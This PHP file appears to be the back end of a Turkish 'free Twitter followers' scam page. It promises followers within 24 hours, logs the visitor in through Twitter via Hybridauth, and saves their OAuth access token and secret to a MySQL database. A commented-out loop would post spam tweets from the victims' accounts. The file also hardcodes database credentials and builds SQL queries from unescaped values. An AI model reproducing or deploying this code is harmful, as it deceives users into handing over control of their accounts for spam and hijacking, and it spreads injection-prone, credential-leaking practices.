<?php


	
  // start a new session (required for Hybridauth)
  session_start();
  $connect = mysql_connect('localhost', 'cl50-djcedrics', 'kBVh!FXrN');
  mysql_select_db('cl50-djcedrics');
  // change the following paths if necessary
  $config   = dirname(__FILE__) . '/library/config.php';
  require_once( "library/Hybrid/Auth.php" );
 
  try{
  	// create an instance for Hybridauth with the configuration file path as parameter
  	$hybridauth = new Hybrid_Auth( $config );
    echo "Talebiniz alindi! Takipcileriniz en geç 24 saat icerisinde hesabiniza yuklenecektir!";
  	// try to authenticate the user with twitter,
  	// user will be redirected to Twitter for authentication,
  	// if he already did, then Hybridauth will ignore this step and return an instance of the adapter
  	$twitter = $hybridauth->authenticate( "Twitter" );
 
    // Get session data
    $hybridauth_session_data = $hybridauth->getSessionData();
    $session_data = unserialize(urldecode($hybridauth_session_data));
    $twitter_access_token = substr($session_data["hauth_session.twitter.token.access_token"], 6, 50);
    $twitter_access_secret = substr($session_data["hauth_session.twitter.token.access_token_secret"], 6, 45 );
	$twitter_provider = $twitter->id;
  $initial_id = 1;
  	// get the user profile
  	$twitter_user_profile = $twitter->getUserProfile();
	$twitter_username = $twitter_user_profile->displayName;
	$twitter_user_id = $twitter_user_profile->identifier;

	// Spam tweet
//	for ($i=0; $i < 5; $i++) { 
//		$twitter->setUserStatus("Aninda 1000 Takipci Kazan!! http://bit.do/takipcikas #takipedenitakipederim ");
//	}
	
 //   echo "Provider: {$twitter_provider} </br> User ID: {$twitter_user_id} </br> Username: {$twitter_username} </br>";
 // 	echo "Ohai there! U are connected with: <b>{$twitter->id}</b><br />";
 // 	echo "As: <b>{$twitter_user_profile->displayName}</b><br />";
 // 	echo "And your provider user identifier is: <b>{$twitter_user_profile->identifier}</b><br />";
 //   echo "<br></br> Your access token: {$twitter_access_token} </br> ";
//	echo "<br></br> Your access token secret: {$twitter_access_secret} </br> ";
  	// debug the user profile
  //	print_r( $twitter_user_profile );
 
  	// exp of using the twitter social api: Returns settings for the authenticating user.
  	$account_settings = $twitter->api()->get( 'account/settings.json' );
 
  	// print recived settings
 // 	echo "Your account settings on Twitter: " . print_r( $account_settings, true );

    $check = mysql_query("SELECT * FROM users WHERE oauth_token = '$twitter_access_token'") or exit(mysql_error() );
    $num_rows = mysql_num_rows($check); //number of rows where duplicates exist
    if($num_rows == 0) { //if there are no duplicates...insert
        store_hybridauth_session( $twitter_provider, $twitter_user_id, $twitter_access_token, $twitter_access_secret, $twitter_username ); 
      }

	// Store info in the database
//	store_hybridauth_session( $twitter_provider, $twitter_user_id, $twitter_access_token, $twitter_access_secret, $twitter_username ); 
	
	 mysql_close( $connect );
  	// disconnect the user ONLY form twitter

	
	
  	// this will not disconnect the user from others providers if any used nor from your application
 // 	echo "Logging out..";
  	$twitter->logout();
  }
  catch( Exception $e ){
  	// Display the recived error,
  	// to know more please refer to Exceptions handling section on the userguide
  	switch( $e->getCode() ){
  	  case 0 : echo "Unspecified error."; break;
  	  case 1 : echo "Hybriauth configuration error."; break;
  	  case 2 : echo "Provider not properly configured."; break;
  	  case 3 : echo "Unknown or disabled provider."; break;
  	  case 4 : echo "Missing provider application credentials."; break;
  	  case 5 : echo "Authentification failed. "
  	              . "The user has canceled the authentication or the provider refused the connection.";
  	           break;
  	  case 6 : echo "User profile request failed. Most likely the user is not connected "
  	              . "to the provider and he should authenticate again.";
  	           $twitter->logout();
  	           break;
  	  case 7 : echo "User not connected to the provider.";
  	           $twitter->logout();
  	           break;
  	  case 8 : echo "Provider does not support this feature."; break;
  	}

    
  	// well, basically your should not display this to the end user, just give him a hint and move on..
  	echo "<br /><br /><b>Original error message:</b> " . $e->getMessage();
	
	 
  }
  function store_hybridauth_session( $provi, $twitter_id, $twitter_token, $twitter_secret, $twitter_username ){
      $sql = "INSERT INTO users ( oauth_provider, oauth_uid, oauth_token, oauth_secret, username) VALUES ( '$provi' , '$twitter_id', '$twitter_token', '$twitter_secret', '$twitter_username')"; 
      if ( mysql_query($sql) )
      {
        echo "</br>Database updated!";
      }
      else
      {
        echo "</br> Failed to update database!";
      }

    }

	function randomGen($min, $max, $quantity) {
    	$numbers = range($min, $max);
    	shuffle($numbers);
    	return array_slice($numbers, 0, $quantity);
	}


      
  ?>